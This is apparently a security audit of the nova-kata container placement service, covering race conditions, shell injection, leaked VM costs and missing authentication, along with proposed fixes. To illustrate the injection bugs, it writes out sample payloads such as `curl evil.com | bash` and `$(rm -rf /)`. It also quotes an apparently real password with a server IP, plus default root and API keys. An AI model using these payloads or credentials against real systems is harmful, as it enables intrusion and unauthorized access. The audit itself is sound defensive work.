# Nova-Kata Control Plane — Security & Architecture Audit

> **Created:** 2026-06-14
> **Scope:** Full deep-dive of nova-kata placement service, worker API, and database layer
> **PostgreSQL Migration Note:** All fixes are designed to be PostgreSQL-compatible. SQLite-specific patterns are annotated with migration notes.

---

## ✅ Fixed Issues

### 1. Double-Claim Race Condition in `warmPool.claimOne()` — FIXED
**Severity:** 🔴 Critical
**File:** `src/db/database.js`

**Problem:** `SELECT` + `UPDATE` were two separate, non-transactional statements. Under concurrent requests, two callers could both `SELECT` the same 'warm' row before either `UPDATE`s it, causing both to be routed to the same container → response mixing, data corruption.

**Fix:** Wrapped in `db.transaction()` to make the SELECT+UPDATE atomic.

**PostgreSQL migration:** Replace with `SELECT ... FOR UPDATE SKIP LOCKED` which is the standard pattern for work queues in PostgreSQL.

---

### 4. Plaintext Password in `check.js` — FIXED (Deleted)
**Severity:** 🔴 Critical
**File:** `check.js` (deleted)

**Problem:** Hardcoded password `'Larbiishak'` and IP `35.232.167.59` committed in source code. The script was a one-off debug tool — the monitoring service and dashboard provide the same functionality.

**Fix:** Deleted the file entirely.

---

### 5. Non-Atomic `containers.updateStatus()` — FIXED
**Severity:** 🟠 High
**File:** `src/db/database.js`

**Problem:** Status, `container_ip`, and `host_port` were updated in 2-3 separate SQL statements. A concurrent read between them could see partial state (e.g., status='running' but container_ip still null).

**Fix:** Single atomic UPDATE using `COALESCE(?, field)` to keep existing values when the parameter is null. `COALESCE` works identically in SQLite and PostgreSQL.

---

### 27. Split-Brain State Between DB and Worker — FIXED
**Severity:** 🔴 Critical
**Files:** `src/services/monitoringService.js`, `worker-api/index.js`

**Problem:** The orchestrator used an imperative paradigm — execute `nerdctl stop`, and if SSH returns exit 0, update SQLite to `status = 'stopped'`. If a worker rebooted, containerd restarted, but containers didn't auto-restart, the DB still said 50 containers were running/warm. The gateway would route traffic to dead containers. This was a "Split-Brain" — the database believed one reality, but the physical hardware experienced another.

**Fix:** Added a **Reconciliation Loop** in `monitoringService.js` that runs after each health check cycle:

1. Calls Worker API `GET /ps` to get actual container state from each healthy worker
2. Compares with DB state for that worker
3. Reconciles discrepancies:
   - Container in DB but missing on worker → mark `failed`
   - Container dead on worker but DB says alive → mark `failed`
   - Container running but DB says paused → update DB to `running`
   - Container paused but DB says running → update DB to `paused`

Uses Worker API (HTTP, ~5ms) instead of SSH (~200ms). Feature-flagged via `RECONCILIATION_ENABLED` env var. Wrapped in try/catch so it never breaks the health check cycle.

**Worker API endpoint added:** `GET /ps` — returns `nerdctl ps -a` container names and statuses.

---

## 📋 Documented Issues (Not Yet Implemented)

### 2. Shell Injection via Environment Variables in `containerService.js`
**Severity:** 🔴 Critical
**File:** `src/services/containerService.js` — `launchContainer()`

**Problem:** User-provided env vars, runtime, memory_limit, and cpu_limit are interpolated directly into a bash script sent over SSH:
```js
for (const [k, v] of Object.entries(envVars)) {
    envFlags.push(`--env ${k}=${v}`);  // e.g., KEY=$(rm -rf /) → executed!
}
options.push(`--runtime ${runtime}`);   // e.g., --runtime kata; curl evil.com |
```

This is a **remote code execution vulnerability**. A malicious `env_vars` payload like `{"; curl evil.com | bash;": "x"}` gets executed on the worker VM.

**Fix — 4 layers of defense:**

1. **Validate env var keys** (must be valid shell identifiers):
```js
const ENV_KEY_REGEX = /^[A-Za-z_][A-Za-z0-9_]*$/;
for (const [k, v] of Object.entries(envVars)) {
    if (!ENV_KEY_REGEX.test(k)) throw new Error(`Invalid env key: ${k}`);
}
```

2. **Shell-escape values** (wrap in single quotes, escape embedded single quotes):
```js
function shellEscape(str) {
    return `'${String(str).replace(/'/g, "'\\''")}'`;
}
envFlags.push(`--env ${k}=${shellEscape(v)}`);
```

3. **Whitelist the runtime** (only known-safe values):
```js
const ALLOWED_RUNTIMES = ['io.containerd.kata.v2', 'io.containerd.runc.v2'];
if (!ALLOWED_RUNTIMES.includes(runtime)) throw new Error(`Invalid runtime: ${runtime}`);
```

4. **Validate numeric fields** (memory, cpu must be positive numbers):
```js
if (memory_limit && (typeof memory_limit !== 'number' || memory_limit <= 0)) {
    throw new Error('memory_limit must be a positive number');
}
```

**Long-term fix:** Migrate `launch` to the Worker API (HTTP), which uses `execFile()` and bypasses the shell entirely. This eliminates ALL shell injection vectors at once.

**Effort:** ~2 hours

---

### 3. Shell Injection in Worker API (`worker-api/index.js`)
**Severity:** 🔴 Critical
**File:** `worker-api/index.js`

**Problem:** Uses `exec()` which passes through a shell:
```js
const { stdout } = await execPromise(`nerdctl ${args}`);  // shell interpolation!
```

If `args` contains user data (container name, image), it's injectable. Example: a container name like `foo; curl evil.com | bash` would execute the injected command.

**Fix:** Switch to `execFile()` which executes the binary directly without a shell:
```js
const execFilePromise = util.promisify(require('child_process').execFile);

// Before (shell — vulnerable):
const { stdout } = await execPromise(`nerdctl unpause ${containerName}`);

// After (no shell — safe):
const { stdout } = await execFilePromise('nerdctl', ['unpause', containerName], { timeout: NERDCTL_TIMEOUT });
```

This requires refactoring each endpoint to build an **args array** instead of a string:
```js
// POST /run
app.post('/run', async (req, res) => {
    const { image, name, runtime, env: envVars, memory, cpus } = req.body;
    const args = ['run', '-d', '--name', name, '--runtime', runtime];
    for (const [k, v] of Object.entries(envVars || {})) {
        args.push('--env', `${k}=${v}`);
    }
    if (memory) args.push('--memory', String(memory));
    if (cpus) args.push('--cpus', String(cpus));
    args.push(image);
    const { stdout } = await execFilePromise('nerdctl', args, { timeout: NERDCTL_TIMEOUT });
    res.json({ containerId: stdout.trim() });
});
```

**Effort:** ~1 hour

---

### 26. Ghost VM Infrastructure Leak in Auto-Scaler
**Severity:** 🔴 Critical
**File:** `src/services/scalingService.js` — `scaleOut()`

**Problem:** The `scaleOut()` function creates a GCP VM, then provisions it, then registers it in SQLite. If provisioning or registration fails (e.g., `apt-get update` fails, SSH drops, network timeout), the `finally` block only resets `scalingInProgress = false`. The GCP VM remains running forever but is never added to the database. The system has no record of it, so `scaleIn()` will never clean it up. This silently drains GCP billing.

**Execution flow:**
```js
// Phase 1: Creates the VM on GCP — $$$ billed from this point
const { ip, zone } = await createInstance({ region, instanceName, rootPassword });

// Phase 2: Wait for SSH — if this times out, VM is orphaned
await waitForSsh({ ip, ... });

// Phase 3: Run Ansible provisioning — if this fails, VM is orphaned
await provisionWorker({ ip, ... });

// Phase 4: Register in DB — if this fails, VM is orphaned
const worker = await initWorker({ ip, ... });

// finally: only resets flag — does NOT clean up the VM
finally { scalingInProgress = false; }
```

**Fix — State Rollback (Compensation Pattern):**
```js
let gcpInstance = null;
try {
    const { ip, zone } = await createInstance({ region, instanceName, rootPassword });
    gcpInstance = { ip, zone, instanceName };  // Track what was created

    await waitForSsh({ ip, ... });
    await provisionWorker({ ip, ... });
    const worker = await initWorker({ ip, ... });
    workers.setGcpMeta(worker.id, { instanceName, zone });
    // ...
} catch (err) {
    // CRITICAL: Clean up the orphaned VM if it was created but not registered
    if (gcpInstance) {
        logger.error(`[AutoScale] Scale-out failed — deleting orphaned VM ${gcpInstance.instanceName}...`);
        await deleteInstance({ instanceName: gcpInstance.instanceName, zone: gcpInstance.zone })
            .catch(e => logger.error(`[AutoScale] FATAL: Failed to delete ghost VM: ${e.message}`));
    }
    throw err;
} finally {
    scalingInProgress = false;
}
```

**Additional safeguard:** Add a periodic "ghost VM scanner" that lists all GCP instances in the project and compares against the `workers` table. Any VM whose name matches `nova-worker-*` but isn't in the DB should be flagged or deleted.

**Effort:** ~1h (rollback) + ~2h (ghost scanner)

---

## 🟠 HIGH — Will Cause Problems Under Load

### 6. SSH Connection Leak on Error in `launchContainer()`
**File:** `src/services/containerService.js`

If an operation throws after `createSSHClient()` but before `ssh.close()`, the SSH connection leaks. Should use try/finally consistently.

**Effort:** ~30min

---

### 7. Stale Cleanup Race Condition (Partially Fixed)
**File:** `src/services/monitoringService.js`

Threshold increased to 10 min, but fundamental issue remains: stale cleanup can mark a container as failed while its launch is still in progress. Better fix: track in-flight launches in memory (`Set` of container IDs) and skip stale cleanup for those.

**Effort:** ~1h

---

### 8. Scaling Fire-and-Forget — Silent Failures
**File:** `src/services/scalingService.js`

`checkAndScale()` fires `scaleOut()` without awaiting. If it fails, no event is recorded in DB and the dashboard gets no notification. Only the log shows the error.

**Effort:** ~1h

---

### 9. No Authentication on ANY Placement Service Endpoint
**Files:** All route files in `src/routes/`

Zero auth middleware. Anyone who can reach `localhost:3002` can launch containers, delete workers, trigger auto-scaling, execute functions, and read API keys.

**Effort:** ~2h

---

### 10. `warmPool.replenish()` — No Concurrency Guard
**File:** `src/services/warmPoolService.js`

If two replenish cycles overlap, they can both try to launch containers for the same function, creating duplicates. Add an in-memory `Set` tracking functions currently being replenished.

**Effort:** ~30min

---

## 🟡 MEDIUM — Functional Issues

### 11. Hardcoded GCP VM Root Password Default
**File:** `src/services/scalingService.js`
```js
const ROOT_PASSWORD = process.env.GCP_VM_ROOT_PASSWORD || 'NovaWorker2025!';
```
Default password committed in code. Remove default, require env var.

**Effort:** ~5min

---

### 12. Auto-Scale Cooldown — Wall Clock vs Monotonic
**File:** `src/services/scalingService.js`

`lastScaleOutAt` uses `Date.now()`. NTP clock jumps can skip or extend cooldown. Use `performance.now()`.

**Effort:** ~10min

---

### 13. `waitForSsh()` — 5-Minute Blocking Poll
**File:** `src/services/scalingService.js`

Blocks for up to 5 min if VM never becomes reachable. `scalingInProgress = true` blocks all future scale attempts. Use AbortController + shorter timeout.

**Effort:** ~1h

---

### 14. Container Launch — No Timeout on Full Launch Sequence
**File:** `src/services/containerService.js`

No overall timeout on `launchContainer()`. A stuck containerd can make this hang indefinitely. Wrap in `Promise.race()` with configurable timeout.

**Effort:** ~30min

---

### 15. Worker API — No HTTPS, Default API Key
**File:** `worker-api/index.js`

Plain HTTP + default API key `'nova-worker-default-key'`. If env var isn't set, every worker uses the same key.

**Effort:** ~2h (HTTPS), ~5min (remove default key)

---

### 16. Error Responses Leak Internals
**Files:** Multiple route files

`err.message` sent to clients — may contain SSH connection strings, SQL errors, file paths. Return generic message in production.

**Effort:** ~1h

---

### 17. No Input Validation on `/containers/launch`
**File:** `src/routes/containers.js`

No validation on image, env_vars, agent_cmd, agent_port, function_id. Combined with shell injection, this is a direct attack vector.

**Effort:** ~2h

---

### 18. Inconsistent Response Formats
**Files:** All route files

Different endpoints return different shapes: `{ success, container }`, `{ container }`, `{ containers, total }`, bare object, `{ error }`. Standardize.

**Effort:** ~2h

---

### 19. `migrate.js` — Destructive Without Confirmation
**File:** `migrate.js`

Drops and recreates tables. No `--dry-run`, no confirmation, no backup.

**Effort:** ~30min

---

## 🔵 LOW — Code Quality

### 20. No Graceful Shutdown in Worker API
**File:** `worker-api/index.js`

No SIGTERM/SIGINT handler. In-flight requests killed mid-execution on restart.

### 21. Multer v2 (Alpha) in package.json
`multer@^2.1.1` is alpha/beta. Pin to stable v1.x.

### 22. SSH `exec()` Timeout — Silent Truncation
**File:** `src/utils/ssh.js`

Timeout error doesn't distinguish between "command timed out" and "command failed".

### 23. No Health Endpoint on Placement Service
**File:** `src/index.js`

No `/health` for container orchestrators or load balancers.

### 24. `kill-zombies.js` — No Dry Run
Script kills processes matching a pattern. No `--dry-run` mode.

### 25. Hardcoded IPs in `clean-nginx.js`, `clean-nginx-nerdctl.js`
Scripts target `35.232.167.59` regardless of actual worker.

---

## Summary

| # | Issue | Severity | Effort | Status |
|---|---|---|---|---|
| 1 | Double-claim race condition | 🔴 Critical | 30min | ✅ Fixed |
| 2 | Shell injection (env vars) | 🔴 Critical | 2h | 📋 Documented |
| 3 | Shell injection (worker API) | 🔴 Critical | 1h | 📋 Documented |
| 4 | Plaintext password in git | 🔴 Critical | 5min | ✅ Fixed |
| 5 | Non-atomic container update | 🟠 High | 30min | ✅ Fixed |
| 6 | SSH connection leak | 🟠 High | 30min | 📋 Planned |
| 7 | Stale cleanup race | 🟠 High | 1h | 🟡 Partial |
| 8 | Silent scale failures | 🟠 High | 1h | 📋 Planned |
| 9 | No API authentication | 🟠 High | 2h | 📋 Planned |
| 10 | Replenish concurrency | 🟠 High | 30min | 📋 Planned |
| 11 | Default VM password | 🟡 Medium | 5min | 📋 Planned |
| 12 | Wall clock cooldown | 🟡 Medium | 10min | 📋 Planned |
| 13 | 5-min blocking SSH poll | 🟡 Medium | 1h | 📋 Planned |
| 14 | No launch timeout | 🟡 Medium | 30min | 📋 Planned |
| 15 | Worker API no HTTPS | 🟡 Medium | 2h | 📋 Planned |
| 16 | Error leaks internals | 🟡 Medium | 1h | 📋 Planned |
| 17 | No input validation | 🟡 Medium | 2h | 📋 Planned |
| 18 | Inconsistent responses | 🟡 Medium | 2h | 📋 Planned |
| 19 | Destructive migration | 🟡 Medium | 30min | 📋 Planned |
| 26 | Ghost VM infrastructure leak | 🔴 Critical | 1h | 📋 Documented |
| 27 | Split-brain state (DB vs worker) | 🔴 Critical | 1h | ✅ Fixed |
| 20-25 | Code quality (low) | 🔵 Low | ~3h | 📋 Planned |
